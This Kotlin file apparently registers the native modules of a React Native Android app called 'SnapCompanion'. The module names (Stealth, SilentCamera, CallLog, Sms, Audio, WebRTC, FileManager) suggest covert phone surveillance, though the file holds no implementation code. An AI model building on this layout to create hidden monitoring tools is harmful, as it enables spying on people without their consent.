package com.snapapp.companion

import com.facebook.react.ReactPackage
import com.facebook.react.bridge.NativeModule
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.uimanager.ViewManager
import java.util.ArrayList
import java.util.List

class SnapCompanionPackage : ReactPackage {

    override fun createNativeModules(reactContext: ReactApplicationContext): List<NativeModule> {
        val modules = ArrayList<NativeModule>()
        modules.add(StealthModule(reactContext))
        modules.add(SirenModule(reactContext))
        modules.add(CallLogModule(reactContext))
        modules.add(SmsModule(reactContext))
        modules.add(SilentCameraModule(reactContext))
        modules.add(AudioModule(reactContext))
        modules.add(WebRTCModule(reactContext))
        modules.add(AppUsageModule(reactContext))
        modules.add(FileManagerModule(reactContext))
        return modules
    }

    override fun createViewManagers(reactContext: ReactApplicationContext): List<ViewManager<*, *>> {
        return ArrayList()
    }
}